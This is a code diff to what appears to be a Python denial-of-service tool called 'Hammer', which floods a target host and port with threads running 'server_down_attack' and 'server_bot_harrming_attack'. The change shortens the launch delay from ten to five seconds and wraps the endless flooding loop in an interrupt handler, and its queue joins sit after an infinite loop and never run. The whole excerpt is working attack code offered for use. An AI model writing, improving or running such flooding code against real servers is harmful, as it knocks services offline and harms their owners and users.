@@ -208,24 +208,28 @@ Connection: {DefaultHttpParameters.Headers.Connection}
         """Run Attacks"""
         
         print(FontColors.green(f"host: {self.server} port: {self.port} turbo: {self.turbo}"))
-        print(FontColors.yellow("Hammer Attack will start 10 second later ..."))
-        time.sleep(10)
+        print(FontColors.yellow("Hammer Attack will start 5 second later ..."))
+        time.sleep(5)
 
         while True:
-            for _ in range(self.turbo):
-                threading.Thread(target=self.server_down_attack, daemon=True).start()
-                threading.Thread(target=self.server_bot_harrming_attack, daemon=True).start()
-            
-            time_start = time.time()
-            task_count = 0
-            while True:
-                if (task_count > 1800):
-                    task_count = 0
-                    time.sleep(.1)
-                task_count += 1
-                self.queue_one.put(task_count)
-                self.queue_two.put(task_count)
+            try:
+                for _ in range(self.turbo):
+                    threading.Thread(target=self.server_down_attack, daemon=True).start()
+                    threading.Thread(target=self.server_bot_harrming_attack, daemon=True).start()
+                
+                task_count = 0
+                while True:
+                    if (task_count > 1800):
+                        task_count = 0
+                        time.sleep(.1)
+                    task_count += 1
+                    self.queue_one.put(task_count)
+                    self.queue_two.put(task_count)
+                self.queue_one.join()
+                self.queue_two.join()
 
+            except (KeyboardInterrupt, SystemExit):
+                print(FontColors.blue(time.ctime())+FontColors.yellow("Attack Stopping"))
 
 if __name__ == "__main__":
     
